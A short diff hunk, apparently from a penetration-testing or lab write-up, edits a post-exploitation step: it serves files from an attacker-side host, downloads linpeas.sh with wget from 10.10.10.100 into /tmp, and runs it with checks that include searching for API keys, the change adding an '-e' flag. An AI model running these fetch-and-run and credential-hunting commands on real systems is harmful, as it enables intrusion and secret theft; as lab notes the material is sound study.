@@ -256,7 +256,7 @@ sudo python3 -m http.server 8080
 cd /tmp
 wget 10.10.10.100:8080/linpeas.sh
 chmod +x linpeas.sh
-./linpeas.sh -q -o system_information,container,cloud,procs_crons_timers_srvcs_sockets,network_information,users_information,software_information,interesting_perms_files,interesting_files,api_keys_regex
+./linpeas.sh -q -o system_information,container,cloud,procs_crons_timers_srvcs_sockets,network_information,users_information,software_information,interesting_perms_files,interesting_files,api_keys_regex -e
 ```
 
 # Extraction
